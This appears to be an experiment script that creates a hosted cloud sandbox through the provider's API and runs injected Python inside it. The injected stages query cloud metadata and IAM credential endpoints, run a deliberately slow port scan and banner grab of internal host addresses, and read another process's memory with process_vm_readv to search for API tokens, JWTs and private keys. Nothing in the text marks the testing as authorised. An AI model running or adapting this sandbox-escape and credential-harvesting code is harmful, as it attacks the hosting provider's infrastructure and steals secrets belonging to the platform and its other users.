# 实验J246: 宿主内网低慢端口探测 + metadata + 本机IP确认
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj246"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) 本机 IP + metadata + DNS (低慢, 安全)
CODE_A = r'''
import socket, urllib.request, urllib.error, subprocess
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 本机 IP
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("64.64.0.1", 9))
    p("MYIP", s.getsockname()[0])
    s.close()
except Exception as e:
    p("MYIP_EXC", repr(e))
# metadata 169.254.169.254
for url in ("http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://169.254.169.254/", "http://100.100.100.200/latest/meta-data/"):
    try:
        r = urllib.request.urlopen(url, timeout=3)
        p("MD", url, r.status, r.read()[:300])
    except urllib.error.HTTPError as e:
        p("MD", url, "HTTP", e.code)
    except Exception as e:
        p("MD", url, "EXC", type(e).__name__, str(e)[:60])
# DNS 解析 (内部域名?)
for name in ("host.docker.internal", "gateway.docker.internal", "metadata.google.internal", "metadata.vercel.internal", "sandbox.local", "cell", "vercel.internal"):
    try:
        p("DNS", name, socket.gethostbyname(name))
    except Exception as e:
        p("DNS", name, "EXC", type(e).__name__)
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_BASIC", timeout=100)

# B) 低慢 TCP 探测 64.64.0.2/3/1 的常见端口
CODE_B = r'''
import socket, time
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
PORTS = [22, 80, 443, 2375, 2376, 3000, 5000, 5432, 6379, 8080, 8443, 9090, 10250, 2379, 2380, 6443, 8200, 8000, 8888, 10000]
def probe(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        r = s.connect_ex((ip, port))
        s.close()
        return r
    except Exception as e:
        return "EXC"
for ip in ("64.64.0.1", "64.64.0.2", "64.64.0.3"):
    for port in PORTS:
        r = probe(ip, port)
        if r == 0:
            p("OPEN", ip, port)
        time.sleep(0.3)  # 低慢
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_PROBE", timeout=280)

# C) 64.64.0.2/3 已开端口服务识别 (HTTP banner)
CODE_C = r'''
import socket
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def banner(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        s.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        d = s.recv(400)
        s.close()
        return d[:300]
    except Exception as e:
        return "EXC:" + type(e).__name__
targets = []
for ip in ("64.64.0.2", "64.64.0.3"):
    for port in (80, 443, 8080, 3000, 8000):
        targets.append((ip, port))
for ip, port in targets:
    b = banner(ip, port)
    p("BNR", ip, port, b)
    time.sleep(0.5)
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_BANNER", timeout=100)

# D) 继续 PVR dump: 0xe9e000 之后 (4MB-16MB) + 全段扫描
CODE_D = r'''
import ctypes, re
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_readv.restype = ctypes.c_ssize_t
pat = re.compile(rb"(?:vcp_[A-Za-z0-9]{20,}|sk_[A-Za-z0-9]{20,}|rk_[A-Za-z0-9]{20,}|glc_[A-Za-z0-9]{20,}|eyJ[A-Za-z0-9_-]{30,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|/run/vercel[a-zA-Z0-9_\-\./]{3,60}|connect[A-Za-z0-9_\-\.:/]{8,80}|proxy[A-Za-z0-9_\-\.:/]{8,80})")
base = 0xe9e000 + 0x400000  # 从 4MB 处继续
total = 0
found = 0
for i in range(192):  # 12MB
    off = i * 0x10000
    buf = ctypes.create_string_buffer(0x10000)
    local = Iovec(ctypes.cast(buf, ctypes.c_void_p), 0x10000)
    remote = Iovec(base + off, 0x10000)
    n = libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
    if n <= 0:
        p("PVR_STOP", hex(base + off), "n", n, "errno", ctypes.get_errno())
        break
    total += n
    for m in pat.finditer(buf.raw[:n]):
        s = m.group(0)
        if len(set(s)) > 3:
            p("FOUND", hex(base + off + m.start()), s[:200])
            found += 1
            if found > 15:
                break
    if found > 15:
        break
p("PVR_TOTAL", total)
p("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_PVR2", timeout=100)

# E) 30002/23456 变体: 30002 用 IPv4 地址 + 23456 不连接(已知杀) + 检查监听者的本机地址
CODE_E = r'''
import socket
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 本机 IP 上探测 30001/30002/23456 (从外部视角)
ip = socket.gethostbyname(socket.gethostname())
p("HOSTNAME_IP", ip)
# 检查是否有其他接口 IP
import subprocess
r = subprocess.run("cat /proc/net/fib_trie | head -30", shell=True, capture_output=True, text=True, timeout=10)
p("FIB", (r.stdout + r.stderr)[:800].replace(chr(10), "|"))
# 30002 从本机 IP 连接 (非 127.0.0.1)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ip, 30002))
    p("30002_EXT", "C_OK")
    s.close()
except Exception as e:
    p("30002_EXT", "EXC", type(e).__name__, str(e)[:80])
p("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_EXT", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
